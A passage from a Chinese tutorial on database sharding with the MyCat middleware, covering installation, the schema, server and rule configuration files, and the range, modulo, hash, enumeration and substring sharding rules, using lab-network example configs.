- **CPU瓶颈**：排序、分组、连接查询、聚合统计等SQL会耗费大量的CPU资源，请求数太多，CPU出现瓶颈。

为了解决上述问题，我们需要对数据库进行分库分表处理。

分库分表的中心思想都是将数据分散存储，使得单一数据库/表的数据量变小来缓解单一数据库的性能问题，从而达到提升数据库性能的目的。

#### 拆分策略

分库分表的形式主要包括两种：**垂直拆分**和**水平拆分**。而拆分的粒度，一般又分为**分库**和**分表**，所以组成的拆分策略最终如下：

![image-20220726182856006](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/b2aa28fa5ffccbf741f43b92507e143e-6576386.png)

#### 垂直拆分

- **垂直分库**

  以表为依据，根据业务将不同**表**拆分到不同库中。

  ![image-20220726182946400](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7dfab875fa4ca4d4844585b1ef3752cb-a6fc689.png)

  **特点**：

  - 每个库的表结构都不一样。
  - 每个库的数据也不一样。
  - 所有库的并集是全量数据。

- **垂直分表**

  以字段为依据，根据字段属性将不同**字段**拆分到不同表中。

  ![image-20220726183044965](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ad69ec9372cbfb228d677fdfbedc16c1-b5ab145.png)

  **特点**：

  - 每个表的结构都不一样。
  - 每个表的数据也不一样，一般通过一列（主键/外键）关联。
  - 所有表的并集是全量数据。

#### 水平拆分

- **水平分库** 

  以字段为依据，按照一定策略，将一个库的**数据**拆分到多个库中。

  ![image-20220726183221920](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/d43a718930437b9619f6496196efee99-ed6dce2.png)

  **特点**：

  - 每个库的表结构都一样。
  - 每个库的数据都不一样。
  - 所有库的并集是全量数据。

- **水平分表** 

  以字段为依据，按照一定策略，将一个表的**数据**拆分到多个表中。

  ![image-20220726183338309](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/40ba72c642b2b834fe65c56fb8d2e6ab-4fa860b.png)

  **特点**： 

  - 每个表的表结构都一样。
  - 每个表的数据都不一样。
  - 所有表的并集是全量数据。

#### 实现技术

**MyCat**：数据库分库分表中间件，不用调整代码即可实现分库分表，支持多种语言。

![image-20220726183443726](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/530a85596ff33ddf75eda119e21b3a10-b46f5bc.png)

### MyCat概述

Mycat是开源的、活跃的、基于Java语言编写的MySQL数据库中间件。可以像使用mysql一样来使用mycat，对于开发人员来说根本感觉不到mycat的存在。

开发人员只需要连接MyCat即可，而具体底层用到几台数据库，每一台数据库服务器里面存储了什么数据，都无需关心。 具体的分库分表的策略，只需要在MyCat中配置即可。

在MyCat的整体结构中，分为两个部分：上面的逻辑结构、下面的物理结构。

![image-20220726190129925](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f3a4bcf335705dc09a4712b9ff45b83c-a308a72.png)

在MyCat的逻辑结构主要负责逻辑库、逻辑表、分片规则、分片节点等逻辑结构的处理，而具体的数据存储还是在物理结构，也就是数据库服务器中存储的。

### MyCat搭建

#### 下载

```
官网: http://www.mycat.org.cn/
下载站: http://dl.mycat.org.cn/
文档: https://www.yuque.com/ccazhw/tuacvk
```

#### 安装

Mycat是采用java语言开发的开源的数据库中间件，支持Windows和Linux运行环境，下面介绍MyCat的Linux中的环境搭建。我们需要在准备好的服务器中安装如下软件。

| 服务器 | 安装软件 | 说明 |
| ------ | -------- | ---- |
|192.168.253.134 |JDK、Mycat |MyCat中间件服务器|
|192.168.253.135 |MySQL |分片服务器|
|192.168.253.136 |MySQL |分片服务器|
|192.168.253.137 |MySQL |分片服务器|

```shell
wget http://dl.mycat.org.cn/1.6.7.6/20210831141727/Mycat-server-1.6.7.6-release-20210831141727-linux.tar.gz
sudo tar -zxvf Mycat-server-1.6.7.3-release-20210913163959-linux.tar.gz -C /usr/local/
```

> 解压后, 如果mysql版本不对, 可以访问`https://dev.mysql.com/downloads/connector/j/` 获取jar包替换`/usr/local/mycat/lib/mysql-connctor-java-xxx.jar`

#### 目录

![image-20220726190038442](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/4db5860d46d646825ddda49d6e7871a7-0db6b22.png)

```
bin 	: 存放可执行文件，用于启动停止mycat
conf	: 存放mycat的配置文件
lib		: 存放mycat的项目依赖包（jar）
logs	: 存放mycat的日志文件
```

#### 配置

主要配置项包括`schema.xml` 和 `server.xml`

- **schema.xml** 

  在schema.xml中配置逻辑库、逻辑表、数据节点、节点主机等相关信息。具体的配置如下：

  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE mycat:schema SYSTEM "schema.dtd">
  <mycat:schema xmlns:mycat="http://io.mycat/">
  	<schema name="NI9NES_DB" checkSQLschema="true" sqlMaxLimit="100">
  		<table name="TB_ORDER" dataNode="dn1,dn2,dn3" rule="auto-sharding-long" />
  	</schema>
  	<dataNode name="dn1" dataHost="dhost1" database="ni9nes" />
  	<dataNode name="dn2" dataHost="dhost2" database="ni9nes" />
  	<dataNode name="dn3" dataHost="dhost3" database="ni9nes" />
  
  	<dataHost name="dhost1" maxCon="1000" minCon="10" balance="0"
  			  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">
  		<heartbeat>select user()</heartbeat>
  		<writeHost host="master" url="192.168.253.135:3306" user="root" password="123456" /> 
          <!-- <writeHost host="master" url="jdbc:mysql://192.168.253.135:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" /> -->
  
  	</dataHost>
  	<dataHost name="dhost2" maxCon="1000" minCon="10" balance="0"
  			  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">
  		<heartbeat>select user()</heartbeat>
  		<writeHost host="master" url="192.168.253.136:3306" user="root" password="123456" />
  	</dataHost>
  	<dataHost name="dhost3" maxCon="1000" minCon="10" balance="0"
  			  writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">
  		<heartbeat>select user()</heartbeat>
  		<writeHost host="master" url="192.168.253.137:3306" user="root" password="123456" />
  	</dataHost>
  </mycat:schema>
  ```

- **server.xml** 

  需要在server.xml中配置用户名、密码，以及用户的访问权限信息，具体的配置如下：

  ```xml
  <user name="root" defaultAccount="true">
      <property name="password">123456</property>
      <property name="schemas">NI9NES_DB</property>
      <property name="defaultSchema">NI9NES_DB</property>
  </user>
  
  <user name="user">
      <property name="password">user</property>
      <property name="schemas">NI9NES_DB</property>
      <property name="readOnly">true</property>
  </user>
  ```

#### 启动

配置完毕后，先启动涉及到的3台分片服务器，然后启动MyCat服务器。切换到Mycat的安装目录，执行如下指令，启动Mycat：

```shell
#启动
$ bin/mycat start
#停止
$ bin/mycat stop
```

> Mycat启动之后，占用端口号 8066。可以使用mysql客户端使用8066端口访问
>
> `mysql -h192.168.253.134 -P8066 -uroot -p`

#### 查看运行

启动完毕之后，可以查看logs目录下的启动日志，查看Mycat是否启动完成。

```shell
$ tail -f /usr/local/mycat/logs/wrapper.log
```

![image-20220728172523045](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/958590e4aecdd530c1c11d3916dedb39-02395c2.png)

在往 TB_ORDER 表中插入数据时：

- 如果id的值在1-500w之间，数据将会存储在第一个分片数据库中。
- 如果id的值在500w-1000w之间，数据将会存储在第二个分片数据库中。
- 如果id的值在1000w-1500w之间，数据将会存储在第三个分片数据库中。
- 如果id的值超出1500w，在插入数据时，将会报错。

为什么会出现这种现象，数据到底落在哪一个分片服务器到底是如何决定的呢？ 这是由逻辑表配置时的一个参数 rule 决定的，而这个参数配置的就是分片规则，

![image-20220728173123679](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/7533b708fefa036b5f794b1d205eff90-4e8c4da.png)

### MyCat配置解析

#### schema.xml

![image-20220728173730792](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/27ea9e7ac603bea2efcef759ac4a0fe0-e1e7858.png)

主要包含以下三组标签：

- **schema**标签  

  ```xml
  <schema name="NI9NES_DB" checkSQLschema="true" sqlMaxLimit="100">
      <table name="TB_ORDER" dataNode="dn1,dn2,dn3" rule="auto-sharding-long" />
  </schema>
  ```

  **1) . schema 定义逻辑库** 

  schema 标签用于定义 MyCat实例中的逻辑库 , 一个MyCat实例中, 可以有多个逻辑库 , 可以通过 schema 标签来划分不同的逻辑库。

  MyCat中的逻辑库的概念，等同于MySQL中的**database**概念, 需要操作某个逻辑库下的表时, 也需要切换逻辑库(`use xxx`)。

  **核心属性**：

  - **name**：指定自定义的逻辑库库名
  - **checkSQLschema**：在SQL语句操作时指定了数据库名称，执行时是否自动去除；true：自动去除，false：不自动去除
  - **sqlMaxLimit**：如果未指定limit进行查询，列表查询模式查询多少条记录

  

  **2). schema 中的table定义逻辑表** 

  table 标签定义了MyCat中逻辑库schema下的逻辑表 , 所有需要拆分的表都需要在table标签中定义 。

  **核心属性**：

  - **name**：定义逻辑表表名，在该逻辑库下唯一
  - **dataNode**：定义逻辑表所属的dataNode，该属性需要与dataNode标签中name对应；多个dataNode逗号分隔
  - **rule**：分片规则的名字，分片规则名字是在rule.xml中定义的
  - **primaryKey**：逻辑表对应真实表的主键
  - **type**：逻辑表的类型，目前逻辑表只有全局表和普通表，如果未配置，就是普通表；全局表，配
    置为 global

- **datanode**标签

  ```xml
  <dataNode name="dn1" dataHost="dhost1" database="ni9nes" />
  <dataNode name="dn2" dataHost="dhost2" database="ni9nes" />
  <dataNode name="dn3" dataHost="dhost3" database="ni9nes" />
  ```

  **核心属性**：

  - **name**：定义数据节点名称
  - **dataHost**：数据库实例主机名称，引用自 dataHost 标签中name属性
  - **database**：定义分片所属数据库

- **datahost**标签

  ```xml
  <dataHost name="dhost1" maxCon="1000" minCon="10" balance="0"
            writeType="0" dbType="mysql" dbDriver="native" switchType="1"  slaveThreshold="100">
      <heartbeat>select user()</heartbeat>
      <writeHost host="master" url="192.168.253.135:3306" user="root" password="123456" /> 
      <!-- <writeHost host="master" url="jdbc:mysql://192.168.253.135:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="1234" /> -->
  </dataHost>
  ```

  该标签在MyCat逻辑库中作为底层标签存在, 直接定义了具体的数据库实例、读写分离、心跳语句。

  **核心属性**：

  - **name**：唯一标识，供上层标签使用
  - **maxCon/minCon**：最大连接数/最小连接数
  - **balance**：负载均衡策略，取值 0,1,2,3
  - **writeType**：写操作分发方式（0：写操作转发到第一个writeHost，第一个挂了，切换到第二个；1：写操作随机分发到配置的writeHost）
  - **dbDriver**：数据库驱动，支持 native、jdbc

#### rule.xml

rule.xml 中定义所有拆分表的规则, 在使用过程中可以灵活的使用分片算法, 或者对同一个分片算法使用不同的参数, 它让分片过程可配置化。主要包含两类标签：tableRule、Function。

```xml
<tableRule name="auto-sharding-long">
    <rule>
        <columns>id</columns>
        <algorithm>rang-long</algorithm>
    </rule>
</tableRule>
<function name="rang-long"
          class="io.mycat.route.function.AutoPartitionByLong">
    <property name="mapFile">autopartition-long.txt</property>
</function>
```

![image-20220728175004503](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/422faa391d4d3c80ecc662b9805da837-b705298.png)

#### server.xml

server.xml配置文件包含了MyCat的系统配置信息，主要有两个重要的标签：system、user。

**1). system标签** 

```xml
<system>
	<property name="nonePasswordLogin">0</property> <!-- 0为需要密码登陆、1为不需要密码登陆 ,默认为0，设置为1则需要指定默认账户-->
	<property name="ignoreUnknownCommand">0</property><!-- 0遇上没有实现的报文(Unknown command:),就会报错、1为忽略该报文，返回ok报文。
	在某些mysql客户端存在客户端已经登录的时候还会继续发送登录报文,mycat会报错,该设置可以绕过这个错误-->
	<!--  ... -->
</system>
```

主要配置MyCat中的系统配置信息，对应的系统配置项及其含义，如下：

| 属性 | 取值 | 含义 |
| ---- | ---- | ---- |
|charset |utf8|设置Mycat的字符集, 字符集需要与MySQL的字符集保持一致|
|nonePasswordLogin |0,1|0为需要密码登陆、1为不需要密码登陆 ,默认为0，设置为1则需要指定默认账户|
|useHandshakeV10 |0,1|使用该选项主要的目的是为了能够兼容高版本的jdbc驱动, 是否采用HandshakeV10Packet来与client进行通信, 1:是, 0:否|
|useSqlStat |0,1|开启SQL实时统计, 1 为开启 , 0 为关闭 ;开启之后, MyCat会自动统计SQL语句的执行情况 ;mysql -h 127.0.0.1 -P 9066 -u root -p 查看MyCat执行的SQL, 执行效率比较低的SQL , SQL的整体执行情况、读写比例等 ; show @@sql ; show @@sql.slow ; show @@sql.sum ;|
|useGlobleTableCheck |0,1|是否开启全局表的一致性检测。1为开启 ，0为关闭 。|
|sqlExecuteTimeout |1000 |SQL语句执行的超时时间 , 单位为 s ;|
|sequnceHandlerType |0,1,2|用来指定Mycat全局序列类型，0 为本地文件，1 为数据库方式，2 为时间戳列方式，默认使用本地文件方式，文件方式主要用于测试|
|sequnceHandlerPattern |正则表达式|必须带有MYCATSEQ或者 mycatseq进入序列匹配流程 注意MYCATSEQ_有空格的情况|
|subqueryRelationshipCheck |true,false|子查询中存在关联查询的情况下,检查关联字段中是否有分片字段 .默认 false|
|useCompression |0,1|开启mysql压缩协议 , 0 : 关闭, 1 : 开启|
|fakeMySQLVersion |5.5,5.6 |设置模拟的MySQL版本号|
|defaultSqlParser||由于MyCat的最初版本使用了FoundationDB的SQL解析器, 在MyCat1.3后增加了Druid解析器, 所以要设置defaultSqlParser属性来指定默认的解析器; 解析器有两个 :druidparser 和 fdbparser, 在MyCat1.4之后,默认是druidparser,fdbparser已经废除了|
|processors |1,2....|指定系统可用的线程数量, 默认值为CPU核心 x 每个核心运行线程数量; processors 会影响processorBufferPool, processorBufferLocalPercent, processorExecutor属性, 所有, 在性能调优时, 可以适当地修改processors值|
|processorBufferChunk||指定每次分配Socket Direct Buffer默认值为4096字节, 也会影响BufferPool长度,如果一次性获取字节过多而导致buffer不够用, 则会出现警告, 可以调大该值|
|processorExecutor||指定NIOProcessor上共享businessExecutor固定线程池的大小; MyCat把异步任务交给 businessExecutor线程池中, 在新版本的MyCat中这个连接池使用频次不高, 可以适当地把该值调小|
|packetHeaderSize||指定MySQL协议中的报文头长度, 默认4个字节|
|maxPacketSize||指定MySQL协议可以携带的数据最大大小, 默认值为16M|
|idleTimeout |30|指定连接的空闲时间的超时长度;如果超时,将关闭资源并回收, 默认30分钟|
|txIsolation |1,2,3,4|初始化前端连接的事务隔离级别,默认为REPEATED_READ , 对应数字为3 READ_UNCOMMITED=1; READ_COMMITTED=2; REPEATED_READ=3;SERIALIZABLE=4;|
|sqlExecuteTimeout |300|执行SQL的超时时间, 如果SQL语句执行超时,将关闭连接; 默认300秒;|
|serverPort |8066 |定义MyCat的使用端口, 默认8066|
|managerPort |9066 |定义MyCat的管理端口, 默认9066|

**2). user标签** 

```xml
<user name="root" defaultAccount="true">
    <property name="password">123456</property>
    <property name="schemas">NI9NES_DB</property>
    <property name="defaultSchema">NI9NES_DB</property>
</user>

<user name="user">
    <property name="password">user</property>
    <property name="schemas">NI9NES_DB</property>
    <property name="readOnly">true</property>
    <property name="defaultSchema">NI9NES_DB</property>
</user>
```

配置MyCat中的用户、访问密码，以及用户针对于逻辑库、逻辑表的权限信息，权限描述方式及配置说明如下：

![image-20220728181011744](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/bb798f91e99df291d1935cd89dfa6ecb-5026139.png)

在进行权限操作时，我们只需要将 `privileges` 标签的注释放开。 在 `privileges` 下的`schema标签`中配置的`dml属性`配置的是**逻辑库的权限**。 在`privileges`的`schema`下的`table标签`的`dml属性`中配置**逻辑表的权限**。

### MyCat分片

#### 垂直拆分

![image-20220904065344210](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/aa43d34f21263716255c8ab5a7af5a20-3eb4aa2.png)

##### 环境准备

| 服务器          | 安装软件   | 说明              |
| --------------- | ---------- | ----------------- |
| 192.168.253.134 | JDK、Mycat | MyCat中间件服务器 |
| 192.168.253.135 | MySQL      | 分片服务器        |
| 192.168.253.136 | MySQL      | 分片服务器        |
| 192.168.253.137 | MySQL      | 分片服务器        |

##### 配置

**1) . schema.xml**

```xml
	<schema name="shopping" checkSQLschema="true" sqlMaxLimit="100">
		<table name="tb_goods_base" dataNode="dn1" primaryKey="id" />
		<table name="tb_goods_brand" dataNode="dn1" primaryKey="id" />
		<table name="tb_goods_cat" dataNode="dn1" primaryKey="id" />
		<table name="tb_goods_desc" dataNode="dn1" primaryKey="goods_id" />
		<table name="tb_goods_item" dataNode="dn1" primaryKey="id" />

		<table name="tb_order_item" dataNode="dn2" primaryKey="id" />
		<table name="tb_order_master" dataNode="dn2" primaryKey="order_id" />
		<table name="tb_order_pay_log" dataNode="dn2" primaryKey="out_trade_no" />

		<table name="tb_user" dataNode="dn3" primaryKey="id" />
		<table name="tb_user_address" dataNode="dn3" primaryKey="id" />

        <table name="tb_areas_provinces" dataNode="dn1,dn2,dn3" primaryKey="id" type="global"/>
		<table name="tb_areas_city" dataNode="dn1,dn2,dn3" primaryKey="id" type="global"/>
		<table name="tb_areas_region" dataNode="dn1,dn2,dn3" primaryKey="id" type="global"/>
	</schema>

	<schema name="logs" checkSQLschema="true" sqlMaxLimit="100">
		<table name="tb_log" dataNode="dn4,dn5,dn6" primaryKey="id" rule="mod-long"/>
		<table name="tb_user" dataNode="dn4,dn5,dn6" rule="sharding-by-intfile-enumstatus"/>
	</schema>

	<dataHost name="dhost1" maxCon="1000" minCon="10" balance="0" writeType="0" dbType="mysql" dbDriver="jdbc" switchType="1"  slaveThreshold="100">
		<heartbeat>select user()</heartbeat>
		<!-- <writeHost host="master1" url="192.168.253.135:3306" user="root" password="123456" />  -->
		<!-- <writeHost host="master" url="jdbc:mysql://192.168.253.136:3306?autoReconnect=true&amp;allowMultiQueries=true&amp;useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" /> -->
		<writeHost host="master" url="jdbc:mysql://192.168.253.135:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />
	</dataHost>
	<dataHost name="dhost2" maxCon="1000" minCon="10" balance="0" writeType="0" dbType="mysql" dbDriver="jdbc" switchType="1"  slaveThreshold="100">
		<heartbeat>select user()</heartbeat>
		<!-- <writeHost host="master2" url="192.168.253.136:3306" user="root" password="123456" /> -->
		<writeHost host="master" url="jdbc:mysql://192.168.253.136:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />

	</dataHost>
	<dataHost name="dhost3" maxCon="1000" minCon="10" balance="0" writeType="0" dbType="mysql" dbDriver="jdbc" switchType="1"  slaveThreshold="100">
		<heartbeat>select user()</heartbeat>
		<!-- <writeHost host="master3" url="192.168.253.137:3306" user="root" password="123456" /> -->
		<writeHost host="master" url="jdbc:mysql://192.168.253.137:3306?useSSL=false&amp;serverTimezone=Asia/Shanghai&amp;characterEncoding=utf8" user="root" password="123456" />
	</dataHost>
</mycat:schema>
```

**2) . server.xml**

```xml
	<user name="root" defaultAccount="true">
		<property name="password">123456</property>
		<property name="schemas">shopping</property>
		<property name="defaultSchema">shopping</property>
		<!--No MyCAT Database selected 错误前会尝试使用该schema作为schema，不设置则为null,报错 -->
		<!-- 表级 DML 权限设置 -->
		<!-- 		
		<privileges check="false">
			<schema name="TESTDB" dml="0110" >
				<table name="tb01" dml="0000"></table>
				<table name="tb02" dml="1111"></table>
			</schema>
		</privileges>		
		 -->
	</user>

	<user name="user">
		<property name="password">user</property>
		<property name="schemas">shopping</property>
		<property name="readOnly">true</property>
		<property name="defaultSchema">shopping</property>
	</user>
```

##### 重新启动服务

```shell
$ bin/mycat restart
```

##### 表结构/数据导入

![image-20220904070228438](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/9daa336a4ddbe9d085c90b68b1f2c724-deecb34.png)

```mysql
mysql> source /pwd/shopping-table.sql
mysql> source /pwd/shopping-insert.sql
```

![image-20220904070622826](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e26bd9062b4db0ebb51f9f742fc4f329-a6eae90.png)

##### 测试SQL

```mysql
select ua.user_id, ua.contact, p.province, c.city, r.area , ua.address from tb_user_address ua ,tb_areas_city c , tb_areas_provinces p ,tb_areas_region r where ua.province_id = p.provinceid and ua.city_id = c.cityid and ua.town_id = r.areaid ;
```

![image-20220904070928845](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/3b94337d4a96ee43a89a15b22ea8731f-867de0e.png)

```mysql
SELECT order_id , payment ,receiver, province , city , area FROM tb_order_master o, tb_areas_provinces p , tb_areas_city c , tb_areas_region r WHERE o.receiver_province = p.provinceid AND o.receiver_city = c.cityid AND o.receiver_region = r.areaid ;
```

![image-20220904071016391](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f2acb1ffc4b55349e52c1d39ec6f013c-8bcf210.png)

##### 全局表

对于省、市、区/县表`tb_areas_provinces` , `tb_areas_city` , `tb_areas_region`，是属于**数据字典表**，在多个业务模块中都可能会遇到，可以将其设置为**全局表**，利于业务操作, 避免跨库查询操作失败。

schema.xml中的逻辑表的配置，修改 `tb_areas_provinces`、`tb_areas_city`、`tb_areas_region` 三个逻辑表，增加 `type` 属性，配置为`global`，就代表该表是全局表，就会在所涉及到的dataNode中创建给表。对于当前配置来说，也就意味着所有的节点中都有该表了。

#### 水平拆分

日志表, 业务系统每天都会产生大量的日志数据 , 单台服务器的数据存储及处理能力是有限的, 可以对数据库表进行拆分。

![image-20220904071353629](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/ba72aca0adeed132eea92095d759aebd-0c72af6.png)

##### 配置

**1). schema.xml**

```xml
	<schema name="logs" checkSQLschema="true" sqlMaxLimit="100">
		<table name="tb_log" dataNode="dn4,dn5,dn6" primaryKey="id" rule="mod-long"/>
	</schema>

	<dataNode name="dn4" dataHost="dhost1" database="logs" />
	<dataNode name="dn5" dataHost="dhost2" database="logs" />
	<dataNode name="dn6" dataHost="dhost3" database="logs" />
```

tb_log表最终落在3个节点中，分别是 dn4、dn5、dn6 ，而具体的数据分别存储在 dhost1、dhost2、dhost3的itcast数据库中。

**2). server.xml** 

```xml
	<user name="root" defaultAccount="true">
		<property name="password">123456</property>
		<property name="schemas">shopping,logs</property>
		<property name="defaultSchema">shopping</property>
	</user>

	<user name="user">
		<property name="password">user</property>
		<property name="schemas">shopping,logs</property>
		<property name="readOnly">true</property>
		<property name="defaultSchema">shopping</property>
	</user>
```

配置root用户既可以访问 SHOPPING 逻辑库，又可以访问ITCAST逻辑库。

##### 重新启动服务

```shell
$ bin/mycat restart
```

##### 表结构/数据导入

8066端口连接Mycat服务

```mysql
mysql> source /pwd/tb-log.sql
```

![image-20220904072107090](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e7099999fd444149d22ac1d8f7dbff69-3c2ac40.png)

### 分片规则

#### 范围分片

**auto-sharding-long** , 根据指定的字段及其配置的范围与数据节点的对应情况， 来决定该数据属于哪一个分片。该分片规则，主要是针对于数字类型的字段。

![image-20220904072242948](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/f5aa563193d8ba654c5d42aa628bdfa7-8b6b796.png)

配置:

```xml
<!-- schema.xml -->
<table name="TB_ORDER" dataNode="dn1,dn2,dn3" rule="auto-sharding-long" /> 

<dataNode name="dn1" dataHost="dhost1" database="db01" />
<dataNode name="dn2" dataHost="dhost2" database="db01" />
<dataNode name="dn3" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="auto-sharding-long">
    <rule>
    	<columns>id</columns>
    	<algorithm>rang-long</algorithm>
    </rule>
</tableRule>
<function name="rang-long" class="io.mycat.route.function.AutoPartitionByLong">
	<property name="mapFile">autopartition-long.txt</property>
	<property name="defaultNode">0</property>
</function>

<!-- autopartition-long.txt -->
# range start-end ,data node index
# K=1000,M=10000.
0-500M=0
500M-1000M=1
1000M-1500M=2
#含义：
#0-500万之间的值，存储在0号数据节点(数据节点的索引从0开始) ； 
#500万-1000万之间的数据存储在1号数据节点 ；
#1000万-1500万的数据节点存储在2号节点 ；
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|mapFile |对应的外部配置文件|
|type |默认值为0 ; 0 表示Integer , 1 表示String|
|defaultNode|默认节点 默认节点的所用:枚举分片时,如果碰到不识别的枚举值, 就让它路由到默认节点 ; 如果没有默认值,碰到不识别的则报错 。|

#### 取模分片

**mod-long**, 根据指定的字段值与节点数量进行求模运算，根据运算结果， 来决定该数据属于哪一个分片。该分片规则，主要是针对于数字类型的字段。

![image-20220904072842806](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/a97a3395cd98b150dbd48775c8abd014-353e68c.png)



配置:

```xml
<!-- schema.xml -->
<table name="tb_log" dataNode="dn4,dn5,dn6" primaryKey="id" rule="mod-long" /> 

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="mod-long">
    <rule>
        <columns>id</columns>
        <algorithm>mod-long</algorithm>
    </rule>
</tableRule>
<function name="mod-long" class="io.mycat.route.function.PartitionByMod">
	<property name="count">3</property>
</function>
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|count |数据节点的数量|

#### 一致性hash分片

**sharding-by-murmur**, 所谓一致性哈希，相同的哈希因子计算值总是被划分到相同的分区表中，不会因为分区节点的增加而改变原来数据的分区位置，有效的解决了分布式数据的拓容问题。该分片规则，可以针对于字符串类型的字段。

![image-20220904073248002](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/e2e99ea4a034f0df030e7eaf3b0d6296-e1311a8.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_order" dataNode="dn4,dn5,dn6" rule="sharding-by-murmur" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-murmur">
    <rule>
        <columns>id</columns>
        <algorithm>murmur</algorithm>
    </rule>
</tableRule>
<function name="murmur" class="io.mycat.route.function.PartitionByMurmurHash">
    <property name="seed">0</property><!-- 默认是0 -->
    <property name="count">3</property>
    <property name="virtualBucketTimes">160</property>
</function>
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|seed |创建murmur_hash对象的种子，默认0|
|count |要分片的数据库节点数量，必须指定，否则没法分片|
|virtualBucketTimes|一个实际的数据库节点被映射为这么多虚拟节点，默认是160倍，也就是虚拟节点数是物理节点数的160倍;virtualBucketTimes*count就是虚拟结点数量 ;|
|weightMapFile|节点的权重，没有指定权重的节点默认是1。以properties文件的格式填写，以从0开始到count-1的整数值也就是节点索引为key，以节点权重值为值。所有权重值必须是正整数，否则以1代替|
|bucketMapPath|用于测试时观察各物理节点与虚拟节点的分布情况，如果指定了这个属性，会把虚拟节点的murmur hash值与物理节点的映射按行输出到这个文件，没有默认值，如果不指定，就不会输出任何东西|

#### 枚举分片

**sharding-by-intfile**, 通过在配置文件中配置可能的枚举值, 指定数据分布到不同数据节点上, 本规则适用于按照省份、性别、状态拆分数据等业务 。

![image-20220904073659891](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/481f190a98f9c5e11a9d31362f3446f0-1a08ecc.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_user" dataNode="dn4,dn5,dn6" rule="sharding-by-intfile-enumstatus"/>

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-intfile">
    <rule>
        <columns>sharding_id</columns>
        <algorithm>hash-int</algorithm>
    </rule>
</tableRule>
<!-- 自己增加 tableRule -->
<tableRule name="sharding-by-intfile-enumstatus">
    <rule>
        <columns>status</columns>
        <algorithm>hash-int</algorithm>
    </rule>
</tableRule>
<function name="hash-int" class="io.mycat.route.function.PartitionByFileMap">
	<property name="defaultNode">2</property>
	<property name="mapFile">partition-hash-int.txt</property>
</function>

<!-- partition-hash-int.txt -->
1=0
2=1
3=2
```

分片规则配置属性含义:

| 属性 | 描述 |
| ---- | ---- |
|columns |标识将要分片的表字段|
|algorithm |指定分片函数与function的对应关系|
|class |指定该分片算法对应的类|
|mapFile |对应的外部配置文件|
|type |默认值为0 ; 0 表示Integer , 1 表示String|
|defaultNode|默认节点 ; 小于0 标识不设置默认节点 , 大于等于0代表设置默认节点 ;默认节点的所用:枚举分片时,如果碰到不识别的枚举值, 就让它路由到默认节点 ; 如果没有默认值,碰到不识别的则报错 。|

#### 应用指定算法

**sharding-by-substring**, 运行阶段由应用自主决定路由到那个分片 , 直接根据字符子串（必须是数字）计算分片号。

![image-20220904074627892](https://ni9ne.oss-cn-shanghai.aliyuncs.com/mdimg/2abb48e0ee2537c3b20e31d73d82671e-51199e3.png)

配置:

```xml
<!-- schema.xml -->
<table name="tb_app" dataNode="dn4,dn5,dn6" rule="sharding-by-substring" />

<dataNode name="dn4" dataHost="dhost1" database="db01" />
<dataNode name="dn5" dataHost="dhost2" database="db01" />
<dataNode name="dn6" dataHost="dhost3" database="db01" />

<!-- rule.xml -->
<tableRule name="sharding-by-substring">
    <rule>
        <columns>id</columns>
        <algorithm>sharding-by-substring</algorithm>
